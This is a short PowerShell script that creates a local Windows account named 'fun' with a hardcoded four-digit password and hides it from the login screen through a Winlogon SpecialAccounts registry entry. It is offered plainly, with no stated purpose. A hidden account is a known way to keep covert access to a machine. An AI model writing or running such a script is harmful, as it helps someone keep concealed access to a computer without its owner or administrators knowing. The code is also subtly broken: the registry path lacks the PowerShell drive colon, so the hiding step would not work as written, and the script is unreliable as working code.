# Run this script as Administrator

$hiddenUsername = "fun"
$password = "4729"  # Change this to your preferred password

# 1. Create the local user account
net user $hiddenUsername $password /add

# 2. Add to the standard "Users" group (default behavior)
net localgroup Users $hiddenUsername /add

# 3. Hide the user from the login screen
$regPath = "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
New-Item -Path $regPath -Force | Out-Null
New-ItemProperty -Path $regPath -Name $hiddenUsername -Value 0 -PropertyType DWord -Force

Write-Host "Hidden account '$hiddenUsername' created."
Write-Host "It won't appear on the login screen but can still be used."
